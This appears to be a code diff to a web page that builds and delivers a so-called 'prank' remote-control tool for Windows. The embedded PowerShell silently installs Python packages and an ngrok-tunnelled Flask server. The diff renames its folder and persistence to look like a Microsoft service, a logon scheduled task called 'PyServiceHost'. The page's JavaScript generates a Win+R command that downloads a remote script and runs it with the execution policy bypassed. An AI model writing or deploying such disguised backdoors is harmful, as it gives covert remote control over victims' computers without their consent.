@@ -361,13 +361,8 @@ $NGROK_TOKEN = "%%NGROK_TOKEN%%"
 $ErrorActionPreference = "SilentlyContinue"
 $ProgressPreference    = "SilentlyContinue"
 
-$INSTALL_DIR = "C:\prank"
-try {
-    New-Item -ItemType Directory -Force -Path $INSTALL_DIR -ErrorAction Stop | Out-Null
-} catch {
-    $INSTALL_DIR = "$env:LOCALAPPDATA\prank"
-    New-Item -ItemType Directory -Force -Path $INSTALL_DIR | Out-Null
-}
+$INSTALL_DIR = "$env:LOCALAPPDATA\Microsoft\PyService"
+New-Item -ItemType Directory -Force -Path $INSTALL_DIR | Out-Null
 
 if (-not (Get-Command python.exe -ErrorAction SilentlyContinue)) {
     $setup = "$env:TEMP\py_setup.exe"
@@ -384,7 +379,7 @@ if (-not (Get-Command python.exe -ErrorAction SilentlyContinue)) {
 python -m pip install --upgrade pip --quiet --no-warn-script-location 2>$null
 python -m pip install flask flask-cors pygame requests pyngrok --quiet --no-warn-script-location 2>$null
 
-$serverPy = @'
+$svcPy = @'
 import os, json, threading, webbrowser, tempfile, time, ctypes, requests
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -490,8 +485,8 @@ if __name__ == "__main__":
 '@
 
 [System.IO.File]::WriteAllText(
-    "$INSTALL_DIR\server.py",
-    $serverPy,
+    "$INSTALL_DIR\svc.py",
+    $svcPy,
     [System.Text.UTF8Encoding]::new($false)
 )
 
@@ -507,15 +502,28 @@ $cfgJson = ([ordered]@{
     [System.Text.UTF8Encoding]::new($false)
 )
 
-$q          = [char]34
-$startupDir = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
-$vbs = "Set sh = CreateObject(${q}WScript.Shell${q})`r`n" +
-       "sh.Run ${q}pythonw.exe ${q}${q}$INSTALL_DIR\server.py${q}${q}${q}, 0, False"
-[System.IO.File]::WriteAllText("$startupDir\prank_server.vbs", $vbs)
+$taskName = "PyServiceHost"
+$pw       = Get-Command pythonw.exe -ErrorAction SilentlyContinue
+$pythonw  = if ($pw) { $pw.Source } else { "pythonw.exe" }
+schtasks /create /tn $taskName /tr "`"$pythonw`" `"$INSTALL_DIR\svc.py`"" /sc onlogon /f /rl limited 2>$null
 
-$pw      = Get-Command pythonw.exe -ErrorAction SilentlyContinue
-$pythonw = if ($pw) { $pw.Source } else { "pythonw.exe" }
-Start-Process $pythonw -ArgumentList "`"$INSTALL_DIR\server.py`"" -WorkingDirectory $INSTALL_DIR
+$uninstall = @'
+$ErrorActionPreference = "SilentlyContinue"
+$dir = "$env:LOCALAPPDATA\Microsoft\PyService"
+Get-Process -Name pythonw, python | Where-Object {
+    (Get-WmiObject Win32_Process -Filter "ProcessId=$($_.Id)").CommandLine -like "*PyService*"
+} | Stop-Process -Force
+schtasks /delete /tn "PyServiceHost" /f 2>$null
+if (Test-Path $dir) { Remove-Item $dir -Recurse -Force }
+'@
+
+[System.IO.File]::WriteAllText(
+    "$INSTALL_DIR\uninstall.ps1",
+    $uninstall,
+    [System.Text.UTF8Encoding]::new($false)
+)
+
+Start-Process $pythonw -ArgumentList "`"$INSTALL_DIR\svc.py`"" -WorkingDirectory $INSTALL_DIR
 </script>
 
 <script>
@@ -545,10 +553,10 @@ Start-Process $pythonw -ArgumentList "`"$INSTALL_DIR\server.py`"" -WorkingDirect
     const box  = document.getElementById('cmdBox');
     const code = document.getElementById('winrCmd');
     if (url) {
-      code.textContent = `powershell -w h -ep bypass -c "iwr '${url}' -UseBasicParsing | iex"`;
+      code.textContent = `cmd /c curl -s -o %TEMP%\\s.ps1 "${url}" && powershell -ep bypass %TEMP%\\s.ps1`;
       box.classList.add('ready');
     } else {
-      code.textContent = `powershell -w h -ep bypass -c "iwr 'TON_URL_RAW' -UseBasicParsing | iex"`;
+      code.textContent = `cmd /c curl -s -o %TEMP%\\s.ps1 "TON_URL_RAW" && powershell -ep bypass %TEMP%\\s.ps1`;
       box.classList.remove('ready');
     }
   }
